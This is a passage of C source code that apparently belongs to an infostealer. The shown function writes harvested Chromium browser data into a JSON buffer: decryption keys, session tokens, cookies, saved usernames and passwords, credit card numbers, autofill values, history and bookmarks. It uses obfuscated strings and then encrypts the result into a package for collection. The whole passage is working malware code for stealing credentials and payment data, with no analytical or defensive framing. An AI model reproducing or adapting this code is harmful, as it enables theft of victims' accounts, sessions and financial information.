        WriteJsonHexToBuf(&JsonBuf, pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"dpapi_key\": "));
        WriteJsonHexToBuf(&JsonBuf, pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        dwCount = min(pChromiumData->dwTokenCount, dwMaxEntries);
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"tokens\": [\n"));
        for (DWORD i = 0; i < dwCount; i++)
        {
            ASCII_JSON_WRITE_TO_MEM("    {\n");
            ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"service\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pTokens[i].pszService); ASCII_JSON_WRITE_TO_MEM(",\n");
            ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"token\": ")); WriteJsonBinaryAsStringToBuf(&JsonBuf, pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen); ASCII_JSON_WRITE_TO_MEM(",\n");
            ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"bind_key\": ")); WriteJsonHexToBuf(&JsonBuf, pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen); ASCII_JSON_WRITE_TO_MEM("\n");
            ASCII_JSON_WRITE_TO_MEM("    }");
            if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
            ASCII_JSON_WRITE_TO_MEM("\n");
        }
        ASCII_JSON_WRITE_TO_MEM("  ],\n");
    }

    dwCount = min(pChromiumData->dwCookieCount, dwMaxEntries);
    ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"cookies\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE_TO_MEM("    {\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"host\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pCookies[i].pszHostKey); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"path\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pCookies[i].pszPath); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"name\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pCookies[i].pszName); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"value\": ")); WriteJsonBinaryAsStringToBuf(&JsonBuf, pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"expires_utc\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pCookies[i].llExpiresUtc); ASCII_JSON_WRITE_TO_MEM("\n");
        ASCII_JSON_WRITE_TO_MEM("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
        ASCII_JSON_WRITE_TO_MEM("\n");
    }
    ASCII_JSON_WRITE_TO_MEM("  ],\n");

    dwCount = min(pChromiumData->dwLoginCount, dwMaxEntries);
    ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"logins\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE_TO_MEM("    {\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"origin_url\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pLogins[i].pszOriginUrl); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"action_url\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pLogins[i].pszActionUrl); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"username\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pLogins[i].pszUsername); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"password\": ")); WriteJsonBinaryAsStringToBuf(&JsonBuf, pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"date_created\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pLogins[i].llDateCreated); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"date_last_used\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pLogins[i].llDateLastUsed); ASCII_JSON_WRITE_TO_MEM("\n");
        ASCII_JSON_WRITE_TO_MEM("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
        ASCII_JSON_WRITE_TO_MEM("\n");
    }
    ASCII_JSON_WRITE_TO_MEM("  ],\n");

    dwCount = min(pChromiumData->dwCreditCardCount, dwMaxEntries);
    ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"credit_cards\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE_TO_MEM("    {\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"name_on_card\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pCreditCards[i].pszNameOnCard); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"nickname\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pCreditCards[i].pszNickname); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"card_number\": ")); WriteJsonBinaryAsStringToBuf(&JsonBuf, pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"expiration_month\": ")); WriteJsonDwordToBuf(&JsonBuf, pChromiumData->pCreditCards[i].dwExpirationMonth); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"expiration_year\": ")); WriteJsonDwordToBuf(&JsonBuf, pChromiumData->pCreditCards[i].dwExpirationYear); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"date_modified\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pCreditCards[i].llDateModified); ASCII_JSON_WRITE_TO_MEM("\n");
        ASCII_JSON_WRITE_TO_MEM("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
        ASCII_JSON_WRITE_TO_MEM("\n");
    }
    ASCII_JSON_WRITE_TO_MEM("  ],\n");

    dwCount = min(pChromiumData->dwAutofillCount, dwMaxEntries);
    ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"autofill\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE_TO_MEM("    {\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"name\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pAutofill[i].pszName); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"value\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pAutofill[i].pszValue); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"count\": ")); WriteJsonDwordToBuf(&JsonBuf, pChromiumData->pAutofill[i].dwCount); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"date_created\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pAutofill[i].llDateCreated); ASCII_JSON_WRITE_TO_MEM("\n");
        ASCII_JSON_WRITE_TO_MEM("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
        ASCII_JSON_WRITE_TO_MEM("\n");
    }
    ASCII_JSON_WRITE_TO_MEM("  ],\n");

    dwCount = min(pChromiumData->dwHistoryCount, dwMaxEntries);
    ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"history\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE_TO_MEM("    {\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"url\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pHistory[i].pszUrl); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"title\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pHistory[i].pszTitle); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"visit_count\": ")); WriteJsonDwordToBuf(&JsonBuf, pChromiumData->pHistory[i].dwVisitCount); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"last_visit_time\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pHistory[i].llLastVisitTime); ASCII_JSON_WRITE_TO_MEM("\n");
        ASCII_JSON_WRITE_TO_MEM("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
        ASCII_JSON_WRITE_TO_MEM("\n");
    }
    ASCII_JSON_WRITE_TO_MEM("  ],\n");

    dwCount = min(pChromiumData->dwBookmarkCount, dwMaxEntries);
    ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"bookmarks\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE_TO_MEM("    {\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"name\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pBookmarks[i].pszName); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"url\": ")); WriteJsonStringToBuf(&JsonBuf, pChromiumData->pBookmarks[i].pszUrl); ASCII_JSON_WRITE_TO_MEM(",\n");
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("      \"date_added\": ")); WriteJsonTimestampToBuf(&JsonBuf, pChromiumData->pBookmarks[i].llDateAdded); ASCII_JSON_WRITE_TO_MEM("\n");
        ASCII_JSON_WRITE_TO_MEM("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE_TO_MEM(",");
        ASCII_JSON_WRITE_TO_MEM("\n");
    }
    ASCII_JSON_WRITE_TO_MEM("  ]\n");

    ASCII_JSON_WRITE_TO_MEM("}\n");

    if (!EncryptAndAddJsonEntry(pPack, pszFilename, JsonBuf.pbData, JsonBuf.dwSize))
        goto _END_OF_FUNC;

    bResult = TRUE;

_END_OF_FUNC:
    JsonBufferFree(&JsonBuf);
    return bResult;
}
